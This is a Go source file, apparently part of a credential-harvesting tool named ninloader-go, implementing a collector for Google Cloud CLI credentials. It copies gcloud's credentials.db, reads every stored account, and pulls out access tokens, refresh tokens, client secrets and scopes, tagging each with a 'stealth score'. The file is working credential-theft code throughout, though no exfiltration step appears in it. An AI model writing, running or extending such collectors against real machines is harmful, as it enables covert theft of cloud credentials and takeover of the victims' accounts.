package google

import (
	"database/sql"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"

	_ "modernc.org/sqlite"

	"github.com/ninken/ninloader-go/internal/collector"
	"github.com/ninken/ninloader-go/internal/platform"
	"github.com/ninken/ninloader-go/internal/registry"
	"github.com/ninken/ninloader-go/internal/types"
)

// GcloudCollector reads credentials from gcloud's SQLite credentials.db.
type GcloudCollector struct {
	collector.BaseCollector
}

func init() {
	registry.Register("google", "gcloud", func() collector.Collector {
		return &GcloudCollector{BaseCollector: collector.BaseCollector{Svc: "google", Src: "gcloud"}}
	})
}

func (c *GcloudCollector) Service() string      { return c.Svc }
func (c *GcloudCollector) Source() string        { return c.Src }
func (c *GcloudCollector) StealthScore() int     { return 5 }
func (c *GcloudCollector) Platforms() []string   { return nil } // all platforms
func (c *GcloudCollector) IsPlatformSupported() bool { return true }

func (c *GcloudCollector) dbPath() string {
	return filepath.Join(platform.GcloudDir(), "credentials.db")
}

// credentialRow holds one row from the credentials table.
type credentialRow struct {
	accountID string
	value     string
}

// safeReadDB copies credentials.db to a temp file (avoids lock conflicts),
// reads all rows, then cleans up the temp copy.
func (c *GcloudCollector) safeReadDB(dbPath string) ([]credentialRow, error) {
	tmp, err := os.CreateTemp("", "ninloader-gcloud-*.db")
	if err != nil {
		return nil, fmt.Errorf("create temp: %w", err)
	}
	tmpPath := tmp.Name()
	tmp.Close()
	defer os.Remove(tmpPath)

	src, err := os.ReadFile(dbPath)
	if err != nil {
		return nil, fmt.Errorf("read db: %w", err)
	}
	if err := os.WriteFile(tmpPath, src, 0600); err != nil {
		return nil, fmt.Errorf("write temp db: %w", err)
	}

	db, err := sql.Open("sqlite", tmpPath)
	if err != nil {
		return nil, fmt.Errorf("open sqlite: %w", err)
	}
	defer db.Close()

	rows, err := db.Query("SELECT account_id, value FROM credentials")
	if err != nil {
		return nil, fmt.Errorf("query: %w", err)
	}
	defer rows.Close()

	var results []credentialRow
	for rows.Next() {
		var r credentialRow
		if err := rows.Scan(&r.accountID, &r.value); err != nil {
			c.Warn(fmt.Sprintf("Failed to scan row: %v", err))
			continue
		}
		results = append(results, r)
	}
	return results, rows.Err()
}

// Discover checks the credentials.db for accounts.
func (c *GcloudCollector) Discover() []*types.DiscoveredToken {
	dbPath := c.dbPath()
	if _, err := os.Stat(dbPath); err != nil {
		return nil
	}

	rows, err := c.safeReadDB(dbPath)
	if err != nil {
		c.Warn(fmt.Sprintf("Failed to read %s: %v", dbPath, err))
		return nil
	}

	var results []*types.DiscoveredToken
	for _, row := range rows {
		results = append(results, &types.DiscoveredToken{
			Service:      c.Svc,
			Source:       c.Src,
			Path:         dbPath,
			AccountHint:  row.accountID,
			StealthScore: 5,
		})
	}
	return results
}

// Collect reads every credential from credentials.db and returns collected tokens.
func (c *GcloudCollector) Collect() []*types.CollectedToken {
	dbPath := c.dbPath()
	if _, err := os.Stat(dbPath); err != nil {
		return nil
	}

	rows, err := c.safeReadDB(dbPath)
	if err != nil {
		c.Warn(fmt.Sprintf("Failed to collect from %s: %v", dbPath, err))
		return nil
	}

	var results []*types.CollectedToken
	for _, row := range rows {
		var credData map[string]any
		if err := json.Unmarshal([]byte(row.value), &credData); err != nil {
			c.Warn(fmt.Sprintf("Could not parse credential JSON for %s", row.accountID))
			continue
		}

		accessToken, _ := credData["access_token"].(string)
		refreshToken, _ := credData["refresh_token"].(string)

		// Skip rows with neither access nor refresh token
		if accessToken == "" && refreshToken == "" {
			continue
		}

		clientID, _ := credData["client_id"].(string)
		clientSecret, _ := credData["client_secret"].(string)
		tokenURI, _ := credData["token_uri"].(string)
		if tokenURI == "" {
			tokenURI = "https://oauth2.googleapis.com/token"
		}
		credType, _ := credData["type"].(string)
		tokenExpiry, _ := credData["token_expiry"].(string)

		// scopes can be []any or nil
		var scopes []string
		if raw, ok := credData["scopes"]; ok {
			if arr, ok := raw.([]any); ok {
				for _, v := range arr {
					if s, ok := v.(string); ok {
						scopes = append(scopes, s)
					}
				}
			}
		}

		tok := types.NewCollectedToken(c.Svc, c.Src, 5)
		tok.AccountID = row.accountID
		tok.Username = row.accountID
		tok.AccessToken = types.Secure(accessToken)
		tok.RefreshToken = types.Secure(refreshToken)
		tok.ClientID = clientID
		tok.ClientSecret = types.Secure(clientSecret)
		tok.TokenURI = tokenURI
		tok.Scopes = scopes
		tok.Extra["type"] = credType
		tok.Extra["expiry"] = tokenExpiry

		results = append(results, tok)
	}
	return results
}
